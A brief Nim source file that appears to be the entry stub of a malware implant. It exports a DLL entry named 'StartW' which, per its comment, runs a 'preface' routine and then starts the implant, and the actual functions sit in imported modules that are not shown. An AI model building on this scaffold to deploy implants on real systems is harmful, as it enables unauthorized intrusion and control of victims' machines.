import custom
import routine/start

proc StartW() {.exportc, dynlib.} =
  # Exported entry that runs the preface and starts the implant
  custom.preface()
  start.main_init()

proc main(): void =
  # Main function that calls the exported entry
  StartW()

main()
